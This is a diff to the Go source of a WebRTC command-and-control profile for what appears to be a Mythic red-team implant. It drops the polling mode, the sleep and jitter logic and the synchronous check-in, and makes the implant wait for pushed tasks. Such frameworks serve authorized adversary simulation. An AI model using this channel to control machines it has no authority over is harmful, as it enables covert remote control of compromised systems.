@@ -1,4 +1,4 @@
-////go:build (linux || darwin) && webrtc
+//go:build (linux || darwin) && webrtc
 
 package profiles
 
@@ -8,11 +8,9 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"net/http"
 	"os"
 	"strconv"
-	"strings"
 	"sync"
 	"time"
 
@@ -151,11 +149,8 @@ func init() {
 		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
 	}
 
-	if initialConfig.TaskingType == "" || initialConfig.TaskingType == "Poll" {
-		profile.TaskingType = TaskingTypePoll
-	} else {
-		profile.TaskingType = TaskingTypePush
-	}
+	// Force Push mode for WebRTC - remove Poll support
+	profile.TaskingType = TaskingTypePush
 
 	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
@@ -169,6 +164,10 @@ func init() {
 }
 
 func (c *C2WebRTC) Sleep() {
+	// In push mode, sleep is not used for tasking intervals
+	if c.TaskingType == TaskingTypePush {
+		return
+	}
 	// wait for either sleep time duration or sleep interrupt
 	select {
 	case <-c.interruptSleepChannel:
@@ -178,7 +177,7 @@ func (c *C2WebRTC) Sleep() {
 
 func (c *C2WebRTC) CheckForKillDate() {
 	for {
-		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
+		if c.ShouldStop {
 			return
 		}
 		time.Sleep(time.Duration(60) * time.Second)
@@ -318,158 +317,70 @@ func (c *C2WebRTC) Start() {
 		return
 	}
 	c.ShouldStop = false
-	if c.TaskingType == TaskingTypePoll {
-		defer func() {
+
+	// WebRTC only supports Push mode now
+	go c.CheckForKillDate()
+
+	defer func() {
+		if c.SignalingConn != nil {
+			c.SignalingConn.Close()
+			c.SignalingConn = nil
+		}
+		if c.PeerConnection != nil {
+			c.PeerConnection.Close()
+			c.PeerConnection = nil
+		}
+		c.stoppedChannel <- true
+	}()
+
+	// Connect to signaling server and establish WebRTC connection
+	if !c.connectSignaling() {
+		utils.PrintDebug("Failed to connect to signaling server")
+		return
+	}
+	// Create a WebRTC connection
+	if !c.setupWebRTC() {
+		utils.PrintDebug("Failed to set up WebRTC")
+		return
+	}
+	// Exchange SDP information
+	if !c.exchangeSDP() {
+		utils.PrintDebug("Failed to exchange SDP")
+		return
+	}
+
+	// Wait for data channel to be ready before proceeding (for push mode too)
+	utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
+	timeout := time.After(30 * time.Second)
+	for {
+		c.Lock.RLock()
+		dataChannel := c.DataChannel
+		c.Lock.RUnlock()
+
+		if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
+			utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")
+
+			// Close the WebSocket connection gracefully now that data channel is ready
 			if c.SignalingConn != nil {
+				utils.PrintDebug("Closing signaling WebSocket connection")
 				c.SignalingConn.Close()
 				c.SignalingConn = nil
 			}
-			if c.PeerConnection != nil {
-				c.PeerConnection.Close()
-				c.PeerConnection = nil
-			}
-			c.stoppedChannel <- true
-		}()
-		// Start WebRTC connection for polling
-		utils.PrintDebug("Connecting to signaling server")
-		if !c.connectSignaling() {
-			utils.PrintDebug("Failed to connect to signaling server")
+
+			utils.PrintDebug("WebSocket closed, data channel ready for push mode")
+			break
+		}
+		select {
+		case <-timeout:
+			utils.PrintDebug("Timeout waiting for data channel to open")
 			return
+		case <-time.After(100 * time.Millisecond):
+			// Continue waiting
 		}
-		// Create a WebRTC connection
-		utils.PrintDebug("Setting up WebRTC")
-		if !c.setupWebRTC() {
-			utils.PrintDebug("Failed to set up WebRTC")
-			return
-		}
-		// Exchange SDP information
-		if !c.exchangeSDP() {
-			utils.PrintDebug("Failed to exchange SDP")
-			return
-		}
-
-		// Wait for data channel to be ready before proceeding
-		utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
-		timeout := time.After(30 * time.Second)
-		for {
-			c.Lock.RLock()
-			dataChannel := c.DataChannel
-			c.Lock.RUnlock()
-
-			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
-				utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")
-
-				// Close the WebSocket connection gracefully now that data channel is ready
-				if c.SignalingConn != nil {
-					utils.PrintDebug("Closing signaling WebSocket connection")
-					c.SignalingConn.Close()
-					c.SignalingConn = nil
-				}
-
-				utils.PrintDebug("WebSocket closed, proceeding with checkin via data channel")
-				break
-			}
-			select {
-			case <-timeout:
-				utils.PrintDebug("Timeout waiting for data channel to open")
-				return
-			case <-time.After(100 * time.Millisecond):
-				// Continue waiting
-			}
-		}
-
-		for {
-			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				utils.PrintDebug("Stopping WebRTC polling")
-				return
-			}
-			checkIn := c.CheckIn()
-			utils.PrintDebug(fmt.Sprintf("Checkin Response: %v", checkIn))
-			// If we successfully checkin, get our new ID and start looping
-			if strings.Contains(checkIn.Status, "success") {
-				SetMythicID(checkIn.ID)
-				SetAllEncryptionKeys(c.Key)
-				break
-			} else {
-				c.Sleep()
-				continue
-			}
-		}
-		for {
-			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				utils.PrintDebug("Stopping WebRTC polling loop")
-				return
-			}
-			// Create a poll message to get tasks
-			message := responses.CreateMythicPollMessage()
-			encResponse, _ := json.Marshal(message)
-			// Send the message to Mythic
-			resp := c.SendMessage(encResponse)
-			if len(resp) > 0 {
-				taskResp := structs.MythicMessageResponse{}
-				err := json.Unmarshal(resp, &taskResp)
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
-					c.Sleep()
-					continue
-				}
-				// Process the response
-				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
-			}
-			c.Sleep()
-		}
-	} else {
-		// Push mode
-		go c.CheckForKillDate()
-		// Connect to signaling server and establish WebRTC connection
-		if !c.connectSignaling() {
-			utils.PrintDebug("Failed to connect to signaling server")
-			return
-		}
-		// Create a WebRTC connection
-		if !c.setupWebRTC() {
-			utils.PrintDebug("Failed to set up WebRTC")
-			return
-		}
-		// Exchange SDP information
-		if !c.exchangeSDP() {
-			utils.PrintDebug("Failed to exchange SDP")
-			return
-		}
-
-		// Wait for data channel to be ready before proceeding (for push mode too)
-		utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
-		timeout := time.After(30 * time.Second)
-		for {
-			c.Lock.RLock()
-			dataChannel := c.DataChannel
-			c.Lock.RUnlock()
-
-			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
-				utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")
-
-				// Close the WebSocket connection gracefully now that data channel is ready
-				if c.SignalingConn != nil {
-					utils.PrintDebug("Closing signaling WebSocket connection")
-					c.SignalingConn.Close()
-					c.SignalingConn = nil
-				}
-
-				utils.PrintDebug("WebSocket closed, data channel ready for push mode")
-				break
-			}
-			select {
-			case <-timeout:
-				utils.PrintDebug("Timeout waiting for data channel to open")
-				return
-			case <-time.After(100 * time.Millisecond):
-				// Continue waiting
-			}
-		}
-
-		// Start processing incoming data from the data channel
-		c.startDataChannelListener()
 	}
+
+	// Start processing incoming data from the data channel
+	c.startDataChannelListener()
 }
 
 func (c *C2WebRTC) Stop() {
@@ -496,7 +407,6 @@ func (c *C2WebRTC) Stop() {
 
 func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
 	changingConnectionParameter := false
-	changingConnectionType := parameter == "TaskingType" && c.TaskingType != value
 
 	switch parameter {
 	case "SignalingServer":
@@ -545,35 +455,19 @@ func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
 			c.Killdate = killDateTime
 		}
 	case "TaskingType":
-		c.Stop()
-		changingConnectionParameter = true
-		if value == TaskingTypePush {
-			c.TaskingType = TaskingTypePush
-		} else if value == TaskingTypePoll {
-			c.TaskingType = TaskingTypePoll
-		}
+		// WebRTC only supports Push mode
+		c.TaskingType = TaskingTypePush
 	}
 
 	if changingConnectionParameter {
 		// disconnect and reconnect for the new connection parameter values
-		if !changingConnectionType {
-			c.Stop()
-		}
+		c.Stop()
 		go c.Start()
-		if changingConnectionType {
-			// if we're changing between push/poll let mythic know to refresh
-			responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
-				Source:        GetMythicID(),
-				Destination:   GetMythicID(),
-				Action:        "remove",
-				C2ProfileName: "webrtc",
-			}
-		}
 	}
 }
 
 func (c *C2WebRTC) GetPushChannel() chan structs.MythicMessage {
-	if c.TaskingType == TaskingTypePush && !c.ShouldStop {
+	if !c.ShouldStop {
 		return c.PushChannel
 	}
 	return nil
@@ -599,20 +493,8 @@ func (c *C2WebRTC) GetSleepTime() int {
 	if c.ShouldStop {
 		return -1
 	}
-	if c.TaskingType == TaskingTypePush {
-		return 0
-	}
-	if c.Jitter > 0 {
-		jit := float64(rand.Int()%c.Jitter) / float64(100)
-		jitDiff := float64(c.Interval) * jit
-		if int(jit*100)%2 == 0 {
-			return c.Interval + int(jitDiff)
-		} else {
-			return c.Interval - int(jitDiff)
-		}
-	} else {
-		return c.Interval
-	}
+	// Push mode doesn't use sleep intervals for tasking
+	return 0
 }
 
 func (c *C2WebRTC) GetSleepInterval() int {
@@ -628,33 +510,11 @@ func (c *C2WebRTC) GetKillDate() time.Time {
 }
 
 func (c *C2WebRTC) SetSleepInterval(interval int) string {
-	if c.TaskingType == TaskingTypePush {
-		return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
-	}
-	if interval >= 0 {
-		c.Interval = interval
-		go func() {
-			c.interruptSleepChannel <- true
-		}()
-		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
-	} else {
-		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
-	}
+	return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
 }
 
 func (c *C2WebRTC) SetSleepJitter(jitter int) string {
-	if c.TaskingType == TaskingTypePush {
-		return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
-	}
-	if jitter >= 0 && jitter <= 100 {
-		c.Jitter = jitter
-		go func() {
-			c.interruptSleepChannel <- true
-		}()
-		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
-	} else {
-		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
-	}
+	return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
 }
 
 func (c *C2WebRTC) ProfileName() string {
@@ -697,57 +557,14 @@ func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
 		utils.PrintDebug(fmt.Sprintf("Checkin msg:  %v \n", checkinMsg))
 
 		// Send checkin message
-		resp := c.SendMessage(checkinMsg)
+		c.SendMessage(checkinMsg)
 
-		// For push mode, we need to handle the response differently
-		if c.TaskingType == TaskingTypePush {
-			// In push mode, the response comes asynchronously through the data channel
-			// We need to wait for it or check if we're already registered
-			if GetMythicID() != "" && GetMythicID() != UUID {
-				// We already have a valid Mythic ID, consider checkin successful
-				utils.PrintDebug("Push mode: Already have valid Mythic ID, checkin considered successful")
-				return structs.CheckInMessageResponse{
-					Status: "success",
-					ID:     GetMythicID(),
-				}
-			}
-
-			// Wait for response through the data channel
-			timeout := time.After(30 * time.Second)
-			for {
-				select {
-				case <-timeout:
-					utils.PrintDebug("Timeout waiting for checkin response in push mode")
-					return structs.CheckInMessageResponse{Status: "failed"}
-				case <-time.After(1 * time.Second):
-					// Check if we got a Mythic ID through the async response
-					if GetMythicID() != "" && GetMythicID() != UUID {
-						utils.PrintDebug("Push mode: Received Mythic ID through async response")
-						return structs.CheckInMessageResponse{
-							Status: "success",
-							ID:     GetMythicID(),
-						}
-					}
-				}
-			}
-		}
-
-		// Poll mode - handle response synchronously
-		utils.PrintDebug(fmt.Sprintf("Response: %v\n", resp))
-		response := structs.CheckInMessageResponse{}
-		err := json.Unmarshal(resp, &response)
-		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("Error unmarshaling checkin response: %s", err.Error()))
-			return structs.CheckInMessageResponse{Status: "failed"}
-		}
-
-		if len(response.ID) > 0 {
-			// only continue on if we actually get an ID
-			SetMythicID(response.ID)
-			c.ExchangingKeys = false
-			c.FinishedStaging = true
-			SetAllEncryptionKeys(c.Key)
-			return response
+		// In push mode, the response comes asynchronously through the data channel
+		// Just return success and let the async response handler deal with it
+		utils.PrintDebug("Push mode: Checkin sent, response will come asynchronously")
+		return structs.CheckInMessageResponse{
+			Status: "success",
+			ID:     "pending", // Will be updated when async response arrives
 		}
 	}
 }
@@ -787,77 +604,17 @@ func (c *C2WebRTC) SendMessage(output []byte) []byte {
 		return nil
 	}
 
-	if c.TaskingType == TaskingTypePush {
-		// Push mode just sends the message, doesn't expect a response
-		if c.DataChannel == nil {
-			utils.PrintDebug("Data channel not established, can't send message")
-			return nil
-		}
-		err = c.DataChannel.Send(messageBytes)
-		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("Error sending WebRTC message: %v", err))
-			go c.reconnect()
-		}
-		return nil
-	} else {
-		// Poll mode sends the message and waits for a response
-		return c.sendAndReceiveMessage(messageBytes)
-	}
-}
-
-// sendAndReceiveMessage sends a message via WebRTC and waits for a response
-func (c *C2WebRTC) sendAndReceiveMessage(messageBytes []byte) []byte {
+	// Push mode just sends the message, doesn't expect a response
 	if c.DataChannel == nil {
-		utils.PrintDebug("Data channel not established, reconnecting")
-		go c.reconnect()
+		utils.PrintDebug("Data channel not established, can't send message")
 		return nil
 	}
-
-	// Add this debug info
-	utils.PrintDebug(fmt.Sprintf("Data channel state: %s", c.DataChannel.ReadyState().String()))
-	utils.PrintDebug(fmt.Sprintf("Data channel label: %s", c.DataChannel.Label()))
-	utils.PrintDebug("sendAndReceiveMessage - Past DataChannel Check; Sending messageBytes via datachannel.")
-
-	// Wait for response with timeout (similar to websocket ReadJSON)
-	responseChan := make(chan []byte, 1)
-
-	// Set up a temporary response handler with mutex protection
-	c.responseMutex.Lock()
-	c.waitingForResponse = true
-	c.responseChannel = responseChan
-	c.responseMutex.Unlock()
-
-	// Send the message
-	err := c.DataChannel.Send(messageBytes)
+	err = c.DataChannel.Send(messageBytes)
 	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("Error sending message: %v", err))
-		// Clean up on error
-		c.responseMutex.Lock()
-		c.waitingForResponse = false
-		c.responseChannel = nil
-		c.responseMutex.Unlock()
+		utils.PrintDebug(fmt.Sprintf("Error sending WebRTC message: %v", err))
 		go c.reconnect()
-		return nil
 	}
-
-	utils.PrintDebug("Message sent via data channel, waiting for response...")
-
-	select {
-	case response := <-responseChan:
-		utils.PrintDebug("Received response from data channel")
-		c.responseMutex.Lock()
-		c.waitingForResponse = false
-		c.responseChannel = nil
-		c.responseMutex.Unlock()
-		return response
-	case <-time.After(30 * time.Second):
-		utils.PrintDebug("Timeout waiting for response")
-		c.responseMutex.Lock()
-		c.waitingForResponse = false
-		c.responseChannel = nil
-		c.responseMutex.Unlock()
-		return nil
-	}
+	return nil
 }
 
 func (c *C2WebRTC) NegotiateKey() bool {
@@ -877,25 +634,8 @@ func (c *C2WebRTC) NegotiateKey() bool {
 		return false
 	}
 
-	resp := c.SendMessage(raw)
-	if c.TaskingType == TaskingTypePush {
-		return true
-	}
-
-	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
-	err = json.Unmarshal(resp, &sessionKeyResp)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("Error unmarshaling RsaResponse %s", err.Error()))
-		return false
-	}
-
-	// Save the new AES session key
-	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
-	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
-	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
-	c.ExchangingKeys = false
-	SetAllEncryptionKeys(c.Key)
-
+	c.SendMessage(raw)
+	// In push mode, return true and let async response handle the rest
 	return true
 }
 
@@ -904,14 +644,9 @@ func (c *C2WebRTC) connectSignaling() bool {
 	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
 
-	// Set Push header if using Push mode
-	if c.TaskingType == TaskingTypePush {
-		header.Set("Accept-Type", "Push")
-		utils.PrintDebug("Using header Accept-Type: Push")
-	} else {
-		header.Set("Accept-Type", "Poll")
-		utils.PrintDebug("Using header Accept-Type: Poll")
-	}
+	// Always set Push header since WebRTC only supports Push mode
+	header.Set("Accept-Type", "Push")
+	utils.PrintDebug("Using header Accept-Type: Push")
 
 	// Connect to the signaling server (no need to add type=offer, client always connects as offer)
 	signalingURL := c.SignalingServer
@@ -1253,7 +988,7 @@ func (c *C2WebRTC) startDataChannelListener() {
 			break
 		}
 
-		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
+		if c.ShouldStop {
 			return
 		}
 
@@ -1271,19 +1006,14 @@ func (c *C2WebRTC) startDataChannelListener() {
 		c.CheckIn()
 	}
 
-	// Send a message to get any pending tasks
-	missedMessages := responses.CreateMythicPollMessage()
-	raw, err := json.Marshal(missedMessages)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("Error marshaling poll message: %v", err))
-	} else {
-		c.SendMessage(raw)
-	}
+	// In pure push mode, do NOT poll for missed messages
+	// Just wait for tasks to be pushed from the server
+	utils.PrintDebug("Push mode active - waiting for tasks to be pushed from server")
 
-	// Main loop - just keep the agent running
+	// Main loop - just keep the agent running and listening
 	// The actual message handling is done by the DataChannel.OnMessage callback
 	for {
-		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
+		if c.ShouldStop {
 			c.closeConnections()
 			return
 		}
@@ -1359,40 +1089,24 @@ func (c *C2WebRTC) reconnect() {
 
 		utils.PrintDebug("Reconnected successfully")
 
-		// If we're in Push mode, re-register with the server
-		if c.TaskingType == TaskingTypePush {
-			// Wait for the data channel to be ready
-			for {
-				c.Lock.RLock()
-				dataChannel := c.DataChannel
-				c.Lock.RUnlock()
+		// Wait for the data channel to be ready
+		for {
+			c.Lock.RLock()
+			dataChannel := c.DataChannel
+			c.Lock.RUnlock()
 
-				if dataChannel != nil {
-					break
-				}
-				if c.ShouldStop {
-					return
-				}
-				time.Sleep(100 * time.Millisecond)
+			if dataChannel != nil {
+				break
 			}
-
-			// Send agent information
-			agentInfo := SignalMessage{
-				Type:      "agent_info",
-				AgentUUID: GetMythicID(),
-				AuthKey:   c.AuthKey,
+			if c.ShouldStop {
+				return
 			}
-
-			agentInfoBytes, _ := json.Marshal(agentInfo)
-			c.DataChannel.Send(agentInfoBytes)
-
-			// If we're exchanging keys, start the key exchange
-			if c.ExchangingKeys {
-				c.NegotiateKey()
-			} else {
-				c.CheckIn()
-			}
+			time.Sleep(100 * time.Millisecond)
 		}
+
+		// In push mode, don't send any polling messages during reconnect
+		// Just re-establish the connection and wait for pushed tasks
+		utils.PrintDebug("Reconnected in push mode - ready to receive pushed tasks")
 
 		return
 	}
@@ -1506,47 +1220,30 @@ func (c *C2WebRTC) processMessage(data []byte) {
 
 	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload length: %d", len(payload)))
 
-	// If we're waiting for a response to sendAndReceiveMessage, send it there
-	c.responseMutex.RLock()
-	waiting := c.waitingForResponse
-	respChan := c.responseChannel
-	c.responseMutex.RUnlock()
-
-	utils.PrintDebug(fmt.Sprintf("processMessage - waitingForResponse: %v, responseChannel exists: %v", waiting, respChan != nil))
-
-	if waiting && respChan != nil {
-		utils.PrintDebug("processMessage - Sending to response channel")
-		select {
-		case respChan <- payload:
-			utils.PrintDebug("processMessage - Successfully sent response to waiting channel")
-		default:
-			utils.PrintDebug("processMessage - Response channel full, processing normally")
-			c.handleNormalMessage(payload)
-		}
-		return
-	}
-
-	utils.PrintDebug("processMessage - Processing as normal message")
-	// Handle normal message processing (like in websocket client)
-	c.handleNormalMessage(payload)
+	// Handle the message based on current state
+	c.handleIncomingMessage(payload)
 }
 
-func (c *C2WebRTC) handleNormalMessage(payload []byte) {
+func (c *C2WebRTC) handleIncomingMessage(payload []byte) {
 	// Handle like the websocket client does in getData()
 	if c.FinishedStaging {
+		// This is a normal task message - handle it
 		taskResp := structs.MythicMessageResponse{}
 		err := json.Unmarshal(payload, &taskResp)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v", err))
 			return
 		}
+		utils.PrintDebug("Received task message from server - processing via push channel")
 		responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 	} else {
 		if c.ExchangingKeys {
 			// Handle key exchange response
 			if c.FinishNegotiateKey(payload) {
+				utils.PrintDebug("Key exchange completed, proceeding with checkin")
 				c.CheckIn()
 			} else {
+				utils.PrintDebug("Key exchange failed, retrying")
 				c.NegotiateKey()
 			}
 		} else {
@@ -1554,7 +1251,7 @@ func (c *C2WebRTC) handleNormalMessage(payload []byte) {
 			checkinResp := structs.CheckInMessageResponse{}
 			err := json.Unmarshal(payload, &checkinResp)
 			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("handleNormalMessage - Error unmarshaling checkin response: %v", err))
+				utils.PrintDebug(fmt.Sprintf("handleIncomingMessage - Error unmarshaling checkin response: %v", err))
 				return
 			}
 
@@ -1562,6 +1259,7 @@ func (c *C2WebRTC) handleNormalMessage(payload []byte) {
 				SetMythicID(checkinResp.ID)
 				c.FinishedStaging = true
 				c.ExchangingKeys = false
+				utils.PrintDebug(fmt.Sprintf("Checkin successful - Agent ID: %s, ready for push tasks", checkinResp.ID))
 			} else {
 				utils.PrintDebug(fmt.Sprintf("Failed to checkin, got: %s", string(payload)))
 			}
